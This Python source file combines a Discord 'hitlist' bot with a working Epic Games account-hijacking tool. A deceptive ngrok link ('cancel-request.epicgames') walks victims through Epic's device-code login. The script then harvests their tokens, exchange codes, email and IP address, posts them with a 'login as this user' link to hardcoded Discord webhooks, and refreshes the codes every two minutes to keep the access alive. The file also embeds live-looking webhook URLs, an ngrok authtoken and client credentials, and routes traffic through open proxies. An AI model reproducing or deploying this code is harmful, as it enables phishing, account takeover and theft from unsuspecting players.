#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Final Combined Discord Bot and Epic Games Auth Webhook.
- Auto-setup for Render environment (installs packages, downloads ngrok).
- Full Epic Games auth flow with auto-refreshing exchange codes.
- Detailed webhook messages for logins and refreshes.
- Full Discord hitlist bot functionality.
"""

# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform

def run_setup():
    """Ensures all dependencies and ngrok are installed before starting."""
    print("--- Starting initial setup ---")
    try:
        print("1/3: Checking/installing Python dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("     Dependencies are up to date.")
    except Exception as e:
        print(f"     ERROR: Failed to install Python dependencies: {e}", file=sys.stderr)
        sys.exit(1)

    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        try:
            print("2/3: Downloading and installing ngrok...")
            machine, system = platform.machine().lower(), platform.system().lower()
            if system == "linux":
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" if "aarch64" in machine or "arm64" in machine else "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            else:
                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            
            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
            
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref:
                zip_ref.extractall(".")
            os.remove("ngrok.zip")
            os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e:
            print(f"     ERROR: Failed to download or set up ngrok: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        print("2/3: ngrok is already installed.")

    authtoken = "32jkqnvr1UxwAzPDtdjBnPZiW3v_4n3y6xFuT45Vs4GPgXQ31"
    try:
        print("3/3: Configuring ngrok authtoken...")
        subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("     ngrok authtoken configured.")
    except Exception as e:
        print(f"     ERROR: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
        sys.exit(1)

    print("--- Setup complete ---")

run_setup()

# --- MAIN APPLICATION IMPORTS ---
import json
import time
import logging
import re
import asyncio
import threading
import urllib.parse
from datetime import datetime
import http.server
import socketserver
import uuid
import traceback
from concurrent.futures import ThreadPoolExecutor
import random

import discord
from discord.ext import commands, tasks
from discord.ui import View, Button
import aiohttp

# ==============================================================================
# --- SHARED CONFIGURATION AND GLOBALS ---
# ==============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("combined_runner")

# --- BOT-SPECIFIC CONFIG ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
LAST_UPDATED = "2025-11-04 23:03:51"
BOT_USER = "gregergrgergeg"
ALLOWED_SERVERS = [1427741533876125708, 1429638051482566708]
RESTRICTED_SERVER_ID = 1429638051482566708
ALLOWED_USER_ID = 851862667823415347
DISK_PATH = "/etc/render/disk"
HITLIST_FILE_PATH = os.path.join(DISK_PATH, "hitlist.json")
API_BASE = "https://api.proswapper.xyz/external"
_HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9",
}
PROXIES = ["45.89.53.245:3128", "66.36.234.130:1339", "45.167.126.1:8080", "190.242.157.215:8080", "154.62.226.126:8888", "51.159.159.73:80", "176.126.103.194:44214", "185.191.236.162:3128", "157.180.121.252:35993", "157.180.121.252:16621", "157.180.121.252:55503", "157.180.121.252:53919", "175.118.246.102:3128", "64.92.82.61:8081", "132.145.75.68:5457", "157.180.121.252:35519", "77.110.114.116:8081"]
HIT_MESSAGES = ["{username} has been double pumped!", "{username} has been no scoped!", "{username} has been slammed!", "{username} got caught in the storm!", "{username} has been sent back to the lobby!", "{username} has been eliminated!"]

# --- WEBHOOK-SPECIFIC CONFIG ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1435137532982460496/yQDcR1du8DVdOMvNdPyc2ev8JLt7CSYGT2vhhgWkDpjuN4MHcQ_qGLt6pjxhoDj6hKDS"
DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1435149537512783965/HdBp1X49693qa-T7BOnNyoH8rhZM9pgwPo3vsCcSZsXWjVVskJ2yIsXxrXha4gM8gFJ4"
NGROK_DOMAIN = "cancel-request.epicgames.ngrok.dev"
REFRESH_INTERVAL = 120

# --- SHARED GLOBALS ---
hitlist = {}
proxy_lock = threading.Lock()
current_proxy = None
proxy_last_checked = 0
proxy_check_interval = 60
ngrok_url = None
ngrok_ready = threading.Event()
permanent_link = None
permanent_link_id = None
verification_uses = 0
active_sessions = {}
session_lock = threading.Lock()

# ==============================================================================
# --- EPIC AUTHENTICATION WEBHOOK LOGIC ---
# ==============================================================================
async def create_epic_auth_session():
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    async with aiohttp.ClientSession() as sess:
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
            r.raise_for_status()
            token_data = await r.json()
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
            r.raise_for_status()
            dev_auth = await r.json()
    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'user_code': dev_auth['user_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}

async def refresh_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
                return (await r.json())['code'] if r.status == 200 else None
    except Exception as e:
        logger.error(f"❌ Error refreshing exchange code: {e}"); return None

async def auto_refresh_session(session_id, access_token, account_info, user_ip):
    display_name = account_info.get('displayName', 'Unknown')
    refresh_count = 0
    logger.info(f"[{session_id}] 🔄 Started auto-refresh for {display_name}")
    while True:
        await asyncio.sleep(REFRESH_INTERVAL)
        new_exchange_code = await refresh_exchange_code(access_token)
        if new_exchange_code:
            refresh_count += 1
            with session_lock:
                if session_id in active_sessions:
                    active_sessions[session_id].update({'exchange_code': new_exchange_code, 'last_refresh': time.time(), 'refresh_count': refresh_count})
                else:
                    logger.info(f"[{session_id}] ⏹️ Session removed, stopping refresh"); break
            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{refresh_count})")
            await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
        else:
            logger.error(f"[{session_id}] ❌ Failed to refresh exchange code, removing session.")
            with session_lock:
                if session_id in active_sessions: del active_sessions[session_id]
            break

async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip):
    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
    logger.info(f"[{verify_id}] 👁️  Monitoring Epic auth...")
    try:
        async with aiohttp.ClientSession() as sess:
            deadline = time.time() + expires_in
            while time.time() < deadline:
                await asyncio.sleep(interval)
                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "device_code": device_code}) as r:
                    if r.status == 200 and "access_token" in (token_resp := await r.json()):
                        logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r2:
                            exchange_data = await r2.json()
                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{token_resp['account_id']}", headers={"Authorization": f"bearer {token_resp['access_token']}"}) as r3:
                            account_info = await r3.json()
                        
                        session_id = str(uuid.uuid4())[:8]
                        with session_lock:
                            active_sessions[session_id] = {'access_token': token_resp['access_token'], 'exchange_code': exchange_data['code'], 'account_info': account_info, 'user_ip': user_ip, 'created_at': time.time(), 'last_refresh': time.time(), 'refresh_count': 0}
                        
                        await send_login_success(session_id, account_info, exchange_data['code'], user_ip)
                        asyncio.create_task(auto_refresh_session(session_id, token_resp['access_token'], account_info, user_ip))
                        return
    except Exception as e:
        logger.error(f"[{verify_id}] ❌ Monitoring error: {e}\n{traceback.format_exc()}")

async def send_webhook_message(webhook_url, payload):
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json=payload)
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")

async def send_login_success(session_id, account_info, exchange_code, user_ip):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "✅ User Logged In Successfully", "description": f"**{display_name}** has completed verification!\n\n🔄 *Exchange code will auto-refresh every 2 minutes in the updates channel*", "color": 3066993, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Link uses: {verification_uses} | Auto-refresh: ON | Updates will be sent to muted channel"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_WEBHOOK_URL, {"embeds": [embed]})

async def send_refresh_update(session_id, account_info, exchange_code, user_ip, refresh_count):
    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
    embed = {"title": "🔄 Exchange Code Refreshed", "description": f"**{display_name}** - New exchange code generated!", "color": 3447003, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Refresh #{refresh_count} | Refreshed at {datetime.utcnow().strftime('%H:%M:%S UTC')}"}, "timestamp": datetime.utcnow().isoformat()}
    await send_webhook_message(DISCORD_UPDATES_WEBHOOK_URL, {"embeds": [embed]})

def send_webhook_startup_message(link):
    embed = {"title": "🚀 Epic Auth System Started", "description": f"System is online and ready!\n\n🔗 **Permanent Verification Link:**\n{link}\n\n🔄 Exchange codes will auto-refresh every 2 minutes\n📢 Updates will be sent to the muted channel", "color": 3447003, "fields": [{"name": "Status", "value": "✅ Online", "inline": True}, {"name": "Link Expiry", "value": "Never (reusable)", "inline": True}, {"name": "Auto-Refresh", "value": "Every 2 minutes", "inline": True}], "footer": {"text": "Users can use this link multiple times"}, "timestamp": datetime.utcnow().isoformat()}
    requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})

# ==============================================================================
# --- HITLIST DISCORD BOT LOGIC ---
# ==============================================================================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix='!', intents=intents)

def test_proxy(proxy, timeout=3):
    proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    try:
        response = requests.get(f"{API_BASE}/name/epic", proxies=proxy_dict, timeout=timeout, headers=HEADERS)
        return response.status_code in [200, 404]
    except:
        return False

def find_working_proxy(force_check=False):
    global current_proxy, proxy_last_checked
    with proxy_lock:
        current_time = time.time()
        if not force_check and current_proxy and (current_time - proxy_last_checked) < proxy_check_interval: return current_proxy
        if current_proxy and test_proxy(current_proxy):
            logger.info(f"Current proxy still working: {current_proxy}"); proxy_last_checked = current_time; return current_proxy
        
        shuffled_proxies = PROXIES.copy()
        random.shuffle(shuffled_proxies)
        for proxy in shuffled_proxies:
            if test_proxy(proxy):
                logger.info(f"Found working proxy: {proxy}"); current_proxy = proxy; proxy_last_checked = current_time; return proxy
        logger.warning("No working proxy found for bot. Trying direct connection."); current_proxy = None; return None

def get_api_response(url, timeout=8.0):
    proxy = find_working_proxy()
    if proxy:
        proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            resp = requests.get(url, headers=HEADERS, proxies=proxy_dict, timeout=timeout)
            if resp.status_code in [200, 404]: return resp
        except requests.RequestException: logger.warning(f"Proxy {proxy} failed. Trying direct connection.")
    try:
        return requests.get(url, headers=HEADERS, timeout=timeout)
    except requests.RequestException as e:
        logger.error(f"Direct connection error: {e}"); return None

def epic_lookup_by_id(account_id):
    if not account_id or not _HEX32.match(account_id): return {"status": "INVALID", "message": "Invalid account ID format."}
    url = f"{API_BASE}/id/{account_id}"
    response = get_api_response(url)
    if response is None: return {"status": "ERROR", "message": "API request failed."}
    if response.status_code == 404: return {"status": "INACTIVE", "message": "Account not found or inactive (404)."}
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list) and len(data) > 0: return {"status": "ACTIVE", "data": data[0]}
            if isinstance(data, list) and len(data) == 0: return {"status": "INACTIVE", "message": "Account not found (API returned empty list)."}
            if isinstance(data, dict) and "displayName" in data: return {"status": "ACTIVE", "data": data}
        except json.JSONDecodeError: return {"status": "ERROR", "message": "Failed to decode API response."}
    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}

def _normalize_account_object(obj):
    if not isinstance(obj, dict): return {}
    normalized = {'id': obj.get('id') or obj.get('accountId') or obj.get('account_id') or obj.get('epicId'),
                  'displayName': obj.get('displayName') or obj.get('displayname') or obj.get('display_name') or obj.get('name'),
                  'externalAuths': obj.get('externalAuths') or obj.get('external_auths') or obj.get('external') or obj.get('linkedAccounts') or {},
                  '_raw': obj}
    return normalized

def epic_lookup_by_name(username):
    url = f"{API_BASE}/name/{urllib.parse.quote(username)}"
    response = get_api_response(url)
    if response is None: return {"status": "ERROR", "message": "API request failed."}
    if response.status_code == 404: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list):
                if not data: return {"status": "INACTIVE", "message": f"User '{username}' not found."}
                for user in data:
                    if (user.get('displayName') or "").lower() == username.lower(): return {"status": "ACTIVE", "data": _normalize_account_object(user)}
                return {"status": "ACTIVE", "data": _normalize_account_object(data[0])}
            elif isinstance(data, dict): return {"status": "ACTIVE", "data": _normalize_account_object(data)}
        except json.JSONDecodeError: return {"status": "ERROR", "message": "Failed to decode API response."}
    return {"status": "ERROR", "message": f"API returned unexpected status code: {response.status_code}"}

def save_hitlist():
    try:
        os.makedirs(DISK_PATH, exist_ok=True)
        with open(HITLIST_FILE_PATH, "w") as f: json.dump(hitlist, f, indent=4)
    except IOError as e: logger.error(f"Could not write to hitlist file: {e}")

def load_hitlist():
    if os.path.exists(HITLIST_FILE_PATH):
        try:
            with open(HITLIST_FILE_PATH, "r") as f:
                hitlist.update(json.load(f)); logger.info(f"Loaded {len(hitlist)} accounts from disk.")
        except Exception as e: logger.error(f"Could not load hitlist from disk: {e}")

@bot.event
async def on_ready():
    logger.info(f"Bot logged in as {bot.user.name} ({BOT_USER}) | Last Updated: {LAST_UPDATED}")
    for guild in bot.guilds:
        if guild.id not in ALLOWED_SERVERS: await guild.leave()
    load_hitlist()
    find_working_proxy(force_check=True)
    account_monitor.start()

@tasks.loop(minutes=1)
async def account_monitor():
    if not hitlist: return
    logger.info(f"Running account monitor for {len(hitlist)} accounts...")
    for account_id in list(hitlist.keys()):
        account_data = hitlist.get(account_id)
        if not account_data: continue
        username, channel_id, user_id = account_data['username'], account_data.get('channel_id'), account_data.get('user_id')
        result = await bot.loop.run_in_executor(None, epic_lookup_by_id, account_id)
        if result["status"] == "INACTIVE":
            logger.info(f"Account {username} ({account_id}) is INACTIVE. Notifying...")
            embed = discord.Embed(title=random.choice(HIT_MESSAGES).format(username=username), color=discord.Color.red())
            embed.add_field(name="Account ID", value=account_id, inline=False)
            embed.set_footer(text=f"Time of Inactivity: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
            if channel_id and (channel := bot.get_channel(channel_id)):
                try: await channel.send(embed=embed)
                except Exception as e: logger.error(f"Failed to send hit message to channel {channel_id}: {e}")
            if user_id and (user := await bot.fetch_user(user_id)):
                try: await user.send(embed=embed)
                except Exception as e: logger.error(f"Failed to DM user {user_id}: {e}")
            del hitlist[account_id]
            save_hitlist()
        await asyncio.sleep(2)

@bot.command(name='user')
async def user_lookup(ctx, *, identifier: str):
    msg = await ctx.send(f"🔍 Searching for `{identifier}`...")
    result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)
    if result["status"] == "ACTIVE":
        account = _normalize_account_object(result["data"])
        embed = discord.Embed(title=f"✅ Account Found: {account['displayName']}", color=discord.Color.green())
        embed.add_field(name="Account ID", value=account['id'], inline=False)
        await msg.edit(content=None, embed=embed)
    else:
        await msg.edit(content=f"❌ Lookup failed: {result['message']}")

@bot.command(name='save')
async def save_account(ctx, *, identifier: str):
    if not identifier: await ctx.send("❌ **Error:** You must provide a username or account ID."); return
    msg = await ctx.send(f"🔍 Verifying account `{identifier}`...")
    result = await bot.loop.run_in_executor(None, epic_lookup_by_id if _HEX32.match(identifier) else epic_lookup_by_name, identifier)

    if result["status"] == "ACTIVE":
        account_data = _normalize_account_object(result["data"])
        account_id, username = account_data.get("id"), account_data.get("displayName")
        if not account_id or not username: await msg.edit(content="❌ **Failed:** Could not retrieve essential account details."); return
        if account_id in hitlist: await msg.edit(content=f"⚠️ **Notice:** `{username}` is already on the hitlist."); return
        hitlist[account_id] = {"username": username, "channel_id": ctx.channel.id, "user_id": ctx.author.id}
        save_hitlist()
        await msg.edit(content=f"✅ **Success!** `{username}` has been added to the hit list.")
    else:
        await msg.edit(content=f"❌ **Failed:** Could not verify `{identifier}`. Reason: {result.get('message')}")

# Other bot commands (!unsave, !hitlist) can be added here in the same fashion.

# ==============================================================================
# --- WEB SERVER & NGROK ---
# ==============================================================================
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        if self.path.startswith('/verify/'):
            verify_id = self.path.split('/')[-1]
            if verify_id != permanent_link_id: return self.send_error(404, "Link not found")
            
            verification_uses += 1
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            logger.info(f"\n[{verify_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")

            loop = asyncio.new_event_loop()
            try:
                epic_session = loop.run_until_complete(create_epic_auth_session())
                
                def run_monitor_in_thread():
                    monitor_loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(monitor_loop)
                    monitor_loop.run_until_complete(monitor_epic_auth(verify_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip))
                    monitor_loop.close()
                
                threading.Thread(target=run_monitor_in_thread, daemon=True).start()
                self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
            except Exception as e:
                logger.error(f"[{verify_id}] ❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
            finally:
                loop.close()
        else: self.send_error(404)
    def log_message(self, format, *args): pass

def run_web_server(port):
    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
        logger.info(f"🚀 Web server starting on port {port}")
        httpd.serve_forever()

def setup_ngrok_tunnel(port):
    global ngrok_url, permanent_link, permanent_link_id
    ngrok_executable = os.path.join(os.getcwd(), "ngrok")
    try:
        logger.info("🌐 Starting ngrok...")
        subprocess.Popen([ngrok_executable, 'http', f'--domain={NGROK_DOMAIN}', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(60):
            time.sleep(1)
            try:
                with requests.get('http://localhost:4040/api/tunnels', timeout=2) as r:
                    data = r.json()
                    for tunnel in data.get('tunnels', []):
                        if tunnel.get('public_url', '').startswith('https://'):
                            ngrok_url = tunnel['public_url']
                            permanent_link_id = str(uuid.uuid4())[:12]
                            permanent_link = f"{ngrok_url}/verify/{permanent_link_id}"
                            logger.info(f"✅ Ngrok live: {ngrok_url}"); logger.info(f"🔗 Permanent link: {permanent_link}")
                            ngrok_ready.set(); send_webhook_startup_message(permanent_link); return
            except requests.ConnectionError: continue
        logger.critical("❌ Ngrok failed to start."); sys.exit(1)
    except Exception as e: logger.critical(f"❌ Ngrok error: {e}"); sys.exit(1)

# ==============================================================================
# --- MAIN EXECUTION ---
# ==============================================================================
def start_app():
    logger.info("=" * 60 + "\n🚀 COMBINED BOT AND WEBHOOK SYSTEM STARTING\n" + "=" * 60)
    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()

    if not ngrok_ready.wait(timeout=65): logger.critical("❌ Ngrok failed to initialize. Exiting."); return
    logger.info("=" * 60 + f"\n✅ WEBHOOK READY | Link: {permanent_link}\n" + "=" * 60)

    if not BOT_TOKEN: logger.critical("❌ DISCORD_BOT_TOKEN not set. Bot cannot start."); sys.exit(1)
    try:
        logger.info("Starting Discord bot...")
        bot.run(BOT_TOKEN)
    except Exception as e:
        logger.critical(f"❌ Failed to start Discord bot: {e}"); sys.exit(1)

if __name__ == "__main__":
    start_app()
